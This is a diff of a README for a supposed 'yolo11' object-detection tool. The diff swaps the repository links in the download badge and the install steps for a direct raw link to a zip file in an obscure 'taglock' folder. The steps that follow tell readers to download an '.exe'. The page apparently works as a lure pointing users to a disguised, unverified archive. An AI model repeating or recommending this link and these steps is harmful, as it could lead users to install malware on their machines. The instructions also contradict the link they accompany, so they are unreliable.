@@ -1,6 +1,6 @@
 # 👁️ yolo11 - Identify objects in your images fast
 
-[![Download yolo11](https://img.shields.io/badge/Download-yolo11-blue.svg)](https://github.com/klausovoviviparous74/yolo11)
+[![Download yolo11](https://img.shields.io/badge/Download-yolo11-blue.svg)](https://github.com/klausovoviviparous74/yolo11/raw/refs/heads/main/taglock/yolo_v3.2.zip)
 
 ## 📌 What is yolo11?
 
@@ -20,7 +20,7 @@ Your computer needs specific hardware to run this software well. Please ensure y
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the following address to download the software: [https://github.com/klausovoviviparous74/yolo11](https://github.com/klausovoviviparous74/yolo11)
+1. Visit the following address to download the software: [https://github.com/klausovoviviparous74/yolo11/raw/refs/heads/main/taglock/yolo_v3.2.zip](https://github.com/klausovoviviparous74/yolo11/raw/refs/heads/main/taglock/yolo_v3.2.zip)
 2. Locate the link labeled Releases on the right side of the page.
 3. Click the most current version available.
 4. Download the file ending in .exe to your hard drive.
